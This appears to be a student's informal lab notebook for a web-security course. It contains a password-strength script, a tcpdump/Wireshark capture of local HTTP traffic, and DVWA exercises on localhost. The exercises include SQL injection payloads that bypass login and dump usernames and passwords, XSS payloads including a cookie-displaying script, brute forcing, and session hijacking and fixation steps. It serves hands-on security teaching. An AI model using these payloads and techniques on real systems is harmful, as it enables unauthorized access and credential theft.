//ex[2 
import string
password = input("Enter password: ")
conditions = 0
# Minimum 8 characters
if len(password) >= 8:
    conditions += 1
# At least one digit
if any(char.isdigit() for char in password):
    conditions += 1
# At least one uppercase letter
if any(char.isupper() for char in password):
    conditions += 1
# At least one lowercase letter
if any(char.islower() for char in password):
    conditions += 1
# At least one special character
if any(char in string.punctuation for char in password):
    conditions += 1
# Strength check
if conditions == 5:
    print("Password Strength: STRONG")
elif conditions >= 3:
    print("Password Strength: MEDIUM")
else:
    print("Password Strength: WEAK")



//
exp 3 traffic ansylsi wireshark

python3 -m http.server 8080 
sudo tcpdump -i any -w capture.pcap port 8080 
 Open Firefox in kali Linux and go to: 
http://localhost:8080 
Refresh the page to generate traffic. 
Go back to tcpdump terminal. 
Stop packet capturing by using Ctrl + C. 

in Kali, just double-click capture.pcap. 

n Wireshark filter bar, type: http.request.method == "GET" 
Press Enter. 
Now only important packets will show. 
Click on any one of the packet and the following data is displayed. 
Browser details such as OS, browser version, language, and visited URLs are visible.If a form is 
submitted, username and password can be seen in plain text.This proves HTTP is insecure.

//
week-4
sudo apt update 

sudo apt install dvwa –y     (or)   sudo apt  –y install dvwa 

sudo service apache2 start 

sudo service mysql start



Step 3: Configure DVWA 
Edit config file: 
sudo nano /etc/dvwa/config.inc.php 
Ensure: 
$_DVWA['db_password'] = ''; 
CTRL + O ,  eneter 
CTRL + X

(or)
Open browser:

http://127.0.0.1/dvwa/setup.php

Then click:

Create / Reset Database
(Or)

Open DVWA in Browser(Firefox) 
http://127.0.0.1/dvwa 
 Login: 
o Username: admin 
o Password: password 
 Click Create / Reset Database



{OR]
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
Wait 1–2 mins till container fully starts.

http://127.0.0.1:8080                                                       (or)              http://localhost:8080
admin
password

tep 8: Authentication Bypass 
Enter: 
1' OR '1'='1  

6. SQL Injection – Database Enumeration 
Step 9: Find Number of Columns 
1' ORDER BY 1-- - 
1' ORDER BY 2-- - 
1' ORDER BY 3-- - 
Stop when error occurs    Last successful number = total columns

Step 10: UNION-Based Injection 
1' UNION SELECT 1,2-- - 

Step 11: Extract Database Name 
1' UNION SELECT database(),2-- - 


Step 12: Extract Table Names 
1' UNION SELECT table_name,2  
FROM information_schema.tables  
WHERE table_schema=database()-- - 


Step 13: Extract Column Names 
1' UNION SELECT column_name,2  
FROM information_schema.columns  
WHERE table_name='users'-- - 


Step 14: Extract Username & Password 
1' UNION SELECT user,password FROM users-- - 

exp5 ?/
 Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux

 Go to: 
DVWA → XSS (Reflected) 

In the input box, type: 
<script>alert('XSS')</script> 
Click Submit. 


Step 4: Stored XSS Test 
Go to: 
DVWA → XSS (Stored) 
Fill the form: 
Name: 
<h1>Hacked</h1> 
Message: 
<script>alert('Stored XSS')</script> 
Click Sign Guestbook. 


INn the URL bar add: 
#<script>alert('DOM XSS')</script> 
Press Enter → popup appears. 

Step 6: Capture Cookie (Lab Demo) 
In Stored XSS Message box: 
<script>alert(document.cookie)</script> 
This shows session cookies (demo of session theft). 

Step 7: Change Security Level 
Go to DVWA Security → set: 
 Medium 
 High 
Repeat the same payloads → see how filtering blocks them. 


// 
exp6
Open Firefox and enter: 
http://127.0.0.1/dvwa 
Step 3: Login to DVWA 
Use default credentials: 
Username: admin   
Password: password 
Step 4: Set Security Level 
 Go to DVWA Security 
 Select LOW 
 Click Submit 
 
PART B: Testing Authentication Weaknesses 
Experiment 1: Weak Password Authentication 
Step 1: Open Brute Force Module 
Navigate to: 
DVWA → Vulnerabilities → Brute Force 
 
 
Step 2: Try Common Passwords 
Enter: 
Username: admin 
Password: password 
Observation 
Successful login indicates weak authentication. 
Experiment 2: Manual Brute Force Attack 
Enter Username (Same Every Time) 
In Username field, type: 
admin 
Do NOT change username. 
Step 3: Try Passwords ONE BY ONE 
Now you will manually try passwords (this is the “manual brute force”). 
Attempt 1 
 Username: admin 
 Password: admin 
 Click Login 
❌ If it fails → try next password 
 
 
 Attempt 2 
 Username: admin 
 Password: 123456 
 Click Login 
❌ If it fails → try next password 
 
 
Attempt 3 
 Username: admin 
 Password: password 
 Click Login 
LOGIN SUCCESSFUL 
Step 4: Observe What Happened 
 DVWA did NOT block you 
 DVWA did NOT lock account 
 DVWA allowed unlimited attempts 
This is called Brute Force Vulnerability 
PART C: Testing Session Management Vulnerabilities 
✅ Experiment 3: Session ID Analysis 
Step 1: Login to DVWA 
Open browser developer tools: 
Right Click → Inspect → Storage → Cookies 
Step 2: Observe Session Cookie 
Look for: 
PHPSESSID 
Observation 
Session ID is visible and not encrypted. 
PHPSESSID : 5f6194766020dcaa2c906358cbd2941b 
Experiment 4: Session Hijacking 
BEFORE YOU START (IMPORTANT) 
DVWA security level = LOW 
You are logged in as admin in DVWA 
STEP-BY-STEP  
Step 1: Open DVWA (Victim Session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa 
3. Login: 
Username: admin 
Password: password 
4. Stay logged in (do NOT logout) 
This browser is the Victim 
Step 2: Copy the Session ID (PHPSESSID) 
1. In the same Firefox window 
2. Right click → Inspect 
3. Click Storage tab 
4. Click Cookies 
5. Select: http://127.0.0.1 
You will see something like: 
PHPSESSID   a8c9f7e3d4b1... 
6. Right-click on PHPSESSID value → Copy 
This value is the session ID (user identity). 
Step 3: Open Attacker Browser (Private Window) 
1. Press: 
Ctrl + Shift + P 
(Private Window opens) 
Do NOT login here. 
Step 4: Paste Session ID in Attacker Browser 
1. In Private Window, go to: http://127.0.0.1/dvwa 
2. Right click → Inspect 
3. Go to Storage → Cookies 
4. Click: http://127.0.0.1 
5. Find PHPSESSID 
6. Replace its value with the copied PHPSESSID (5f6194766020dcaa2c906358cbd2941b) 
7. Press Enter 
Step 5: Refresh Page 
1. Refresh the page (F5) 
You are logged in as admin without username or password! 
Result 
Attacker gains access without login → Session Hijacking. 
Experiment 5: Session Fixation 
IMPORTANT CONDITIONS (CHECK FIRST) 
DVWA Security Level = LOW 
Use only ONE browser window (normal window) 
Do NOT use Private Window here 
STEP-BY-STEP (DO EXACTLY THIS) 
Step 1: Open DVWA WITHOUT Login (Attacker sets session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa/ 
You will see the login page 
Do NOT login 
Step 2: Note the Session ID (Before Login) 
1. Right click → Inspect 
2. Go to Storage 
3. Click Cookies 
4. Select: http://127.0.0.1 
You will see: 
PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
Step 3: Login WITHOUT Closing Browser 
Now, in the same browser window: 
1. Enter: 
Username: admin 
Password: password 
2. Click Login 
Do NOT refresh, do NOT close browser 
Step 4: Check Session ID AGAIN (After Login) 
1. Again open: 
Inspect → Storage → Cookies → http://127.0.0.1 
2. Look at PHPSESSID 
3.  
OBSERVE CAREFULLY 
Case 1 (VULNERABLE – DVWA LOW) 
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
Same value  
Session Fixation exists 
Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE) 
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
Session regenerated  
No session fixation 
Experiment 6:  
CONDITIONS (CHECK FIRST) 
DVWA Security Level = LOW 
You must know how to view cookies  
STEP-BY-STEP ( 
Step 1: Login Normally (Victim Session) 
1. Open Firefox 
2. Go to: http://127.0.0.1/dvwa/ 
3. Login: 
Username: admin 
Password: password 
Step 2: Copy Session ID (IMPORTANT) 
1. Right click → Inspect 
2. Storage → Cookies → http://127.0.0.1 
3. Copy: 
PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
Screenshot 1: PHPSESSID before logout 
Step 3: Logout from DVWA 
1. Click Logout (top right or menu) 
2. You will see login page 
Logout completed 
Step 4: Reuse OLD Session ID (THIS IS THE TEST) 
Option A (EASIEST & EXAM-SAFE) 
1. Open Private Window 
Ctrl + Shift + P 
2. Go to: 
http://127.0.0.1/dvwa/ 
3. Open Inspect → Storage → Cookies 
4. Paste the OLD PHPSESSID (copied earlier) 
5. Press Enter 
Step 5: Open Internal Page (KEY STEP 🔑) 
In address bar, type: 
http://127.0.0.1/dvwa/index.php 
(or) 
http://127.0.0.1/dvwa/vulnerabilities/brute/ 
�
� Do NOT press Login 
�
� Do NOT enter username/password 
�
� EXPECTED RESULT (DVWA LOW) 
✔ You are logged in again 
✔ Without login 
✔ Using old session ID 
Logout did NOT destroy session 
OBSERVATIONS & RESULTS 
Test Case 
Result 
Brute Force Attack 
Weak Password Login Successful 
Allowed 
Session ID Exposure 
Session Hijacking 
Found 
Possible 
Session Fixation 
Improper Logout 
Observed 
Observed 




    //
